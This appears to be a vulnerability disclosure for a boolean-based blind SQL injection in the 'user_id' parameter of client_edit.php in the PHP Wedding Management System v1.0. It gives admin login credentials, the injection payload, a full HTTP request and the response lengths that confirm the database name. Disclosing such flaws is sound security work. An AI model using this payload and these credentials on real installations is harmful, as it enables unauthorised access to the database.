# Wedding Management System v1.0 by codeastr.com has SQL injection

Author： k0xx

The password for the backend login account is: admin@mail.com/Password@123

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: /Wedding-Management/admin/client_edit.php?booking=31&user_id=

Vulnerability location: /Wedding-Management/admin/client_edit.php?booking=31&user_id=,user_id

[+] Payload: /Wedding-Management/admin/client_edit.php?booking=31&user_id=31%20and%20length%20(database())%20=9 // Leak place ---> user_id

Current database name: dbwedding,length is 9

```sql
GET /Wedding-Management/admin/client_edit.php?booking=31&user_id=31%20and%20length%20(database())%20=9 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

When length (database ()) = 8, Content-Length: 14701

![image](https://user-images.githubusercontent.com/54017627/167992100-dbb3bab5-b424-4589-a197-0f31f553c65c.png)

![image](https://user-images.githubusercontent.com/54017627/167992026-9a68a2d4-cf6f-42d1-8843-0a6207a73a21.png)

When length (database ()) = 9, Content-Length: 14095

![image](https://user-images.githubusercontent.com/54017627/167992069-91098888-9733-4927-9ee5-da6a031f4279.png)

![image](https://user-images.githubusercontent.com/54017627/167992038-bd21be92-c19e-43a2-9d42-60815c3ab9b4.png)

